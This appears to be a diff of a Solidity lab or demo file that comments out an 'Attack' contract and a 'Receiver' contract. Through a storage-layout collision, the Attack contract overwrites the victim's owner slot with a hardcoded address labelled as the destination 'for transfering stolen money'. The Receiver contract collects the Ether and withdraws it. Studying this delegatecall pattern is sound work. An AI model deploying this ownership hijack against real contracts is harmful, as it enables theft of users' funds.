@@ -21,34 +21,34 @@ contract Servers {
     }
 }
 
-contract Attack {
-    address owner;// NOTE: storage layout must be the same as contract Server
+// contract Attack {
+//     address owner;// NOTE: storage layout must be the same as contract Server
 
-    constructor() {
-        owner = msg.sender;
-    }
+//     constructor() {
+//         owner = msg.sender;
+//     }
 
-    function exploit() public {
-        // the address of deployed Receiver contract for transfering stolen money
-        owner = address(0xB34db0d5aA577998c10c80d76F87AfE58b024e5F);
-    }
-}
+//     function exploit() public {
+//         // the address of deployed Receiver contract for transfering stolen money
+//         owner = address(0xB34db0d5aA577998c10c80d76F87AfE58b024e5F);
+//     }
+// }
 
-contract Receiver {
-    address owner;
+// contract Receiver {
+//     address owner;
 
-    constructor() {
-        owner = msg.sender;
-    }
+//     constructor() {
+//         owner = msg.sender;
+//     }
 
-    // Function to receive Ether. msg.data must be empty
-    receive() external payable {}
+//     // Function to receive Ether. msg.data must be empty
+//     receive() external payable {}
 
-    // Fallback function is called when msg.data is not empty
-    fallback() external payable {}
+//     // Fallback function is called when msg.data is not empty
+//     fallback() external payable {}
 
-    function withdraw() public {
-        require(msg.sender == owner);
-        payable(msg.sender).transfer(address(this).balance);
-    }
-}
+//     function withdraw() public {
+//         require(msg.sender == owner);
+//         payable(msg.sender).transfer(address(this).balance);
+//     }
+// }
